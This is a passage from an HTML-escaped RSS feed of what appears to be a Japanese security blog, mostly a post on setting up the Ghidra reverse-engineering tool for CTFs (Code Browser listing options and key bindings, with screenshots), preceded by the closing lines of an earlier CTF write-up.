p&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;interactive&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;ざっくりWriteup書きました。&lt;/p&gt;
&lt;p&gt;Pwnは全完できなかったのでもっと修行せねば。。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[CTFのためのGhidra環境構築メモ]]></title><link>https://kashiwaba-yuki.com/ghidra-my-env-setup</link><guid isPermaLink="false">https://kashiwaba-yuki.com/ghidra-my-env-setup</guid><pubDate>Tue, 15 Mar 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;今回はCTFのためにセットアップしているGhidraの環境構築方法をメモしておきます。&lt;/p&gt;
&lt;p&gt;Ghidraのインストールについては公式の&lt;a href=&quot;https://htmlpreview.github.io/?https://github.com/NationalSecurityAgency/ghidra/blob/stable/GhidraDocs/InstallationGuide.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Ghidra Installation Guide&lt;/a&gt;のままなので割愛します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://htmlpreview.github.io/?https://github.com/NationalSecurityAgency/ghidra/blob/stable/GhidraDocs/InstallationGuide.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Ghidra Installation Guide&lt;/a&gt;&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#code-brouser%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;Code Brouserの設定&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#listing-binary%E3%81%AE%E8%A1%8C%E9%96%93&quot;&gt;Listing Binaryの行間&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#key-binding%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;Key bindingの設定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%A9%E3%82%A6%E3%82%A3%E3%83%B3%E3%83%89%E3%82%A6%E3%81%AE%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88&quot;&gt;デコンパイラウィンドウのコメント&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#xref%E3%81%AE%E8%A1%A8%E7%A4%BA%E8%A8%AD%E5%AE%9A%E3%81%AE%E8%BF%BD%E5%8A%A0&quot;&gt;XRefの表示設定の追加&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#eclipse%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot;&gt;Eclipseのセットアップ&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ghidra-develop-tools%E3%82%92eclipse%E3%81%AB%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;Ghidra Develop ToolsをEclipseにインストールする&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#gotools%E3%81%AE%E5%B0%8E%E5%85%A5&quot;&gt;gotoolsの導入&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;スクリプトの設定&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#pwndra%E3%82%92%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97%E3%81%99%E3%82%8B&quot;&gt;pwndraをセットアップする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ghidra_scripts%E3%82%92%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97%E3%81%99%E3%82%8B&quot;&gt;ghidra_scriptsをセットアップする&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91ui%E3%81%AE%E5%A4%89%E6%9B%B4&quot;&gt;おまけ：UIの変更&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;code-brouserの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#code-brouser%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;code brouserの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Code Brouserの設定&lt;/h2&gt;
&lt;p&gt;基本は&lt;a href=&quot;https://www.amazon.co.jp/%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B9%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%83%AA%E3%83%B3%E3%82%B0%E3%83%84%E3%83%BC%E3%83%ABGhidra%E5%AE%9F%E8%B7%B5%E3%82%AC%E3%82%A4%E3%83%89-%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%82%B3%E3%83%B3%E3%83%86%E3%82%B9%E3%83%88%E5%85%A5%E9%96%80%E3%81%8B%E3%82%89%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A7%E3%82%A2%E8%A7%A3%E6%9E%90%E3%81%BE%E3%81%A7-Compass-Books%E3%82%B7%E3%83%AA%E3%83%BC%E3%82%BA-%E4%B8%AD%E5%B3%B6/dp/4839973776/ref=sr_1_1?__mk_ja_JP=%E3%82%AB%E3%82%BF%E3%82%AB%E3%83%8A&amp;#x26;crid=1LZGMPJ1WOENM&amp;#x26;keywords=Ghidra&amp;#x26;qid=1647343767&amp;#x26;sprefix=ghidr%2Caps%2C181&amp;#x26;sr=8-1&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;リバースエンジニアリングツールGhidra実践ガイド&lt;/a&gt;を参考にしてセットアップをしています。&lt;/p&gt;
&lt;h3 id=&quot;listing-binaryの行間&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#listing-binary%E3%81%AE%E8%A1%8C%E9%96%93&quot; aria-label=&quot;listing binaryの行間 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Listing Binaryの行間&lt;/h3&gt;
&lt;p&gt;まずはListing Binaryウィンドウの行間を1に設定します。&lt;/p&gt;
&lt;p&gt;Code Brouserの[Edit]&gt;[Tool Options]から[Listing Fields]&gt;[Bytes Field]の[Maximum Lines To Display]を1に変更しました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5542b165856e1b7dd045e070e2bc4fb4/22475/image-20220315184452595.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 63.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB10lEQVQ4y41U226rMBDk/3+jVT6h6nt1XiodqVLVkhAugTQBDDZgyGnSKJmzu6kpeagUSyMb2B3Pjtd46TpGUZTYbDYwxqBpGpkZXddht9thGIabUCkFL1jOoWix3x9wPp9R1zW0NrDWCmHb3oIWfd/jzZ/DW8xfsVqthIzHdpvLBhzEam8BV2NtBz8I4S39P6h1Qwr3QpgXBaqqEnUczMQXpe2v4DhW+PL+xgpfYLSGG8WEkIM1fcvzXGaG89kpc2u2KIwSeHG8wN9XH3bYXRTm14ScVJYlNL3LyJokitFT8mB7EeIIOZ6t88Isx+wpwLrqRkLlSuZyiJCfE1IZZBmijw9oOnn79QVDZf4o7JAkpJDLicIQaZricDiIGj4UUchlEWlBOwf39wju7hDNZjCPj2gfHqCfn9F8e207JiSFfKq+74t3p9NJZqWqkZCDa9qkjmPoKLrge21IrTuUkZAJmJBN5WFMI704bRs5TSrPoXGgnKmHQliWSghDKvt4PErHM+HoYXPdj+0Uk9bhvGRFHqbrDItFIK3x7/MT20JJyVqun6ZE1xoXYtc+PzBiE+cvlwEpVOV4fTipqLSQMdG61JhnSkpJkljaYnrXXR/yf4C/ReTrf53Vz6y2KHvwAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/5542b165856e1b7dd045e070e2bc4fb4/8ac56/image-20220315184452595.webp 240w,
/static/5542b165856e1b7dd045e070e2bc4fb4/d3be9/image-20220315184452595.webp 480w,
/static/5542b165856e1b7dd045e070e2bc4fb4/e46b2/image-20220315184452595.webp 960w,
/static/5542b165856e1b7dd045e070e2bc4fb4/525da/image-20220315184452595.webp 1039w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/5542b165856e1b7dd045e070e2bc4fb4/8ff5a/image-20220315184452595.png 240w,
/static/5542b165856e1b7dd045e070e2bc4fb4/e85cb/image-20220315184452595.png 480w,
/static/5542b165856e1b7dd045e070e2bc4fb4/d9199/image-20220315184452595.png 960w,
/static/5542b165856e1b7dd045e070e2bc4fb4/22475/image-20220315184452595.png 1039w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/5542b165856e1b7dd045e070e2bc4fb4/d9199/image-20220315184452595.png&quot;
            alt=&quot;image-20220315184452595&quot;
            title=&quot;image-20220315184452595&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;以下がBefore-Afterです。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;↓Before&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 855px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0f2748a25d953abce9cdd76b76c45304/77800/image-20220315184332509.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.00000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABtElEQVQoz31Ra2+cMBDk//+7VP3SqrqEozwODPgBNg/b07Fzd0mkKhaDDd6dndktOhXw9rrgWlm0kufSZpT8rhqHzkSkmE5HtNyrecdLXeOvPPDSNPhZXtHNPt93OqBoGFSPnmQe1Rjw++pxaTwaBjUTwfuEVkW8jhYXseLPoPGj7vDrJnlWKMXGmJjjirqbcCkFWgFoB9S3lbuHkALzumHdgWWPGen8gHYn1i3CHun+I6YQfY+qbHHrGLgAYuArRgx9ja5vsDuNXW2wWiEGZucV8bE+n4HCrhbzvEJKwHvAsmQIrGwdFBWeZ+T/gMDLyEJ87ntEuCM+QcJ1WTAKg2EAkyndbCQMUPKk2h1GnzhpLfiTCeGpKsV4FklI54Ss0GjNRJ0tk5vYcjWjJwjR06rBwYnuLhXy73Txq82nef4vjDFUqDFNgONQDBXGZNkpTFriODb486BKn1vxHWFWuFDWNNL2CKT4hSNLiYtxMMtJwjyjLyrSethMyP2874VWinYlBpGCwN459jL1cIGcHbbUv5An8SR7EPyXUM4SXTvmKSdCKW0mkGqG1Gu2/1nZd3bT+gc9MVd9QegsVwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/0f2748a25d953abce9cdd76b76c45304/8ac56/image-20220315184332509.webp 240w,
/static/0f2748a25d953abce9cdd76b76c45304/d3be9/image-20220315184332509.webp 480w,
/static/0f2748a25d953abce9cdd76b76c45304/31c30/image-20220315184332509.webp 855w&quot;
              sizes=&quot;(max-width: 855px) 100vw, 855px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/0f2748a25d953abce9cdd76b76c45304/8ff5a/image-20220315184332509.png 240w,
/static/0f2748a25d953abce9cdd76b76c45304/e85cb/image-20220315184332509.png 480w,
/static/0f2748a25d953abce9cdd76b76c45304/77800/image-20220315184332509.png 855w&quot;
            sizes=&quot;(max-width: 855px) 100vw, 855px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/0f2748a25d953abce9cdd76b76c45304/77800/image-20220315184332509.png&quot;
            alt=&quot;image-20220315184332509&quot;
            title=&quot;image-20220315184332509&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;↓After&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 802px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8d0611a6715d8bc9e678b54f14d871f1/5a6dd/image-20220315184354221.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 59.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAAB7klEQVQoz21S247iMBTr/3/daF9Gmh2g0AttaZvekzQXrxNgGVYbyTokpD4+dpJ69rhkG9LDjFI4nAuN798L0vOG83lFXmlUvFONDtXkUQwGudD4KHJ83QZ8tzM+LifkjcB19EgKYZF1O8rBxYND6fCV8ay33DuUPCtDffyf9hKHdkEmdvwqK3xe+7g/3ticXEnTTfg+lqhaj3EFxKxx6xWkZhU3rLuHMoC0iPUJuQf4iNcZFY7DgOxcoL0B0wgsJJwJZxSuVYZhamHUAj1qbLzgPZni8nhf930ixID0mKGpPciNadIYRwVrDE5pi5oeLcsOvRloKeG8JSkinHOwAdbGGvbJIEakpwx1zXH7F6GzO/KsRl40GOoJqtdQ28aPzF0PGQPcg+iJqPB8ytE0IFEgVJEUnuk2F7TsslOZoWlGmvjRk/B/KxmGEdmlRNsCFIB11RCCozmLIhds4nj27tiTzD3GNbTH2ufIJAwKOxIqRcJFMxzNC4ahtPQ1kP+0/j7q3/oPkm2T6DrBZKlQsqu2cKuBYee63tH3hgptbLDv5n3UEIx9hEKE38l78p6Jhmej4hiAjfD+ZbraFVa9Mm0fqzTy3cNpmulVhb4LbxAx4b7fSEiFfP3T7PFTlKW3O19AGDmQSy1j83A/KPwDBfiijMqSEhsAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8d0611a6715d8bc9e678b54f14d871f1/8ac56/image-20220315184354221.webp 240w,
/static/8d0611a6715d8bc9e678b54f14d871f1/d3be9/image-20220315184354221.webp 480w,
/static/8d0611a6715d8bc9e678b54f14d871f1/85811/image-20220315184354221.webp 802w&quot;
              sizes=&quot;(max-width: 802px) 100vw, 802px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8d0611a6715d8bc9e678b54f14d871f1/8ff5a/image-20220315184354221.png 240w,
/static/8d0611a6715d8bc9e678b54f14d871f1/e85cb/image-20220315184354221.png 480w,
/static/8d0611a6715d8bc9e678b54f14d871f1/5a6dd/image-20220315184354221.png 802w&quot;
            sizes=&quot;(max-width: 802px) 100vw, 802px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8d0611a6715d8bc9e678b54f14d871f1/5a6dd/image-20220315184354221.png&quot;
            alt=&quot;image-20220315184354221&quot;
            title=&quot;image-20220315184354221&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;結構すっきりして見やすくなったと思います。&lt;/p&gt;
&lt;h3 id=&quot;key-bindingの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#key-binding%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;key bindingの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Key bindingの設定&lt;/h3&gt;
&lt;p&gt;キーバインドは同じくCode Brouserの[Edit]&gt;[Tool Options]から[Key Binding]を選択することで変更できます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/90347f091ba5c0818f8b4c97609708bf/6acbf/image-20220315184903492.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 63.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACOElEQVQ4y12T6XbiMAyF8/7PMS/Sv50p07KlZN9DKEnsrBQIdyS1Ydr6HJ1g2Vx9Wmzk+R55nqOqKgzjiHEYUNUaTlzAy0ok+QGHw4F8Nd2p5VuWFQry1UqhrtXdzz7Dsh0MJMLrep3kG0QJHh5X2MUVkkKheKM/NiMqPUC1Iw6lxsZ04PoJjlWLmvy6e8frzobxar5QFI3b7SbGK0lSLNcmyroVgXa44HQBxjPky/vF8wZr00Y3XMV/JhbXC2DEwRbn8xXTNH0RzPD4tITtxjiqHt04oT/d0J0mDO8gmjP+/F3DciMR4/ORAnl+COPXwwa7YhShafpPuHhewwszunwlkRuGE9skAk1/xhMJ7uwAvQSbhFwEF+stLC8UoZkwJsHfixVsL6b0iIpEmIztQ/AiGSw3ltCy/3QF/IAEfddBlqXo+/4uGEUxXpYbihihUi10Q81oejHdDtTdjuhcKklADenE13QnrKimhut5cBwHx+MR88qyDEVRoO06KK2hlJbxqHlkaLx4TBSNjG4a7PcFwjBEHCfSSMO2bXgk2rbtnTDLchqJAOZ2i+2n+b5P5BHNYCkz+yFcyZ5h+DdrGZZlkXr8rcslEYRxKuSWZYPvpGkq1EzHpD9NUyZ833BdF6ZpymuZFx9y1Lbt0FBavJ+t+iT7bizYSBaSMitzFH4xPVlGdeHn1miqk/qo12w/ydjHd5meMzGkuDOB0nJh/1ZJE5wohx2mCIJAjJvF51/pWJTLwXTcnH978NHYtann/AAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/90347f091ba5c0818f8b4c97609708bf/8ac56/image-20220315184903492.webp 240w,
/static/90347f091ba5c0818f8b4c97609708bf/d3be9/image-20220315184903492.webp 480w,
/static/90347f091ba5c0818f8b4c97609708bf/e46b2/image-20220315184903492.webp 960w,
/static/90347f091ba5c0818f8b4c97609708bf/4ad2e/image-20220315184903492.webp 1001w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/90347f091ba5c0818f8b4c97609708bf/8ff5a/image-20220315184903492.png 240w,
/static/90347f091ba5c0818f8b4c97609708bf/e85cb/image-20220315184903492.png 480w,
/static/90347f091ba5c0818f8b4c97609708bf/d9199/image-20220315184903492.png 960w,
/static/90347f091ba5c0818f8b4c97609708bf/6acbf/image-20220315184903492.png 1001w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/90347f091ba5c0818f8b4c97609708bf/d9199/image-20220315184903492.png&quot;
            alt=&quot;image-20220315184903492&quot;
            title=&quot;image-20220315184903492&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここは好きに設定します。&lt;/p&gt;
&lt;p&gt;個人的によく使うFunction Graphウィンドウの呼び出しなんかを設定してます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 251px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/744c0e97a8191b42acd67a08ec4ff572/26abe/image-20220315190317307.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 36.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABrklEQVQoz12RP2/TUBRH/VWQugKCnQkGtkwwILFRYGBCCD4BIApDi0AdoNCKQhe2SiwIphaJuElsx67t92zHTtPENB3on9QJTnx4SUFUPOnovHuld/X0u5rrCUQQ0kiaE7faHWQQETe38HxJEDUY5EPyEeTDQrlgeIL8PzShHnmOSygChOuTRDFGpUYcNvBsh7YaPDkF/zw6wd/eH7SFzw43FuvcXrK4tWhyZ8Vj+k2Vm29rXJsvM/1e8ODTLvdWf3B3tcvDLyEv1wNerEfMrUWqljz+GvBIeXzX7n+ocmlhm9JySuldh4uvt7iyknL9Y5czcwlTTyOmZgKF5NSTBhfmda4uW5SWHC6/Mjk7a3D6mc652Rrnn5toli3QDQ/LCamYPo6f8H3D5lvZxBNN9IqNDLfp57B/BHsHGa5TQfgW1Y01FVONTitgkP1UERyheUKyuekilF3PJ44TDMOkrOtIGWDVbQzTopPuTOIaLybrj+gPCnpZTqb8a4haHBNrdUdg2hLHi9Qv1VCZqFoQJinp7j5xq0vUTGnv7NEbwEE2otcvjlH12Ieqd5gd+zell+agog6GXAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/744c0e97a8191b42acd67a08ec4ff572/8ac56/image-20220315190317307.webp 240w,
/static/744c0e97a8191b42acd67a08ec4ff572/ceeba/image-20220315190317307.webp 251w&quot;
              sizes=&quot;(max-width: 251px) 100vw, 251px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/744c0e97a8191b42acd67a08ec4ff572/8ff5a/image-20220315190317307.png 240w,
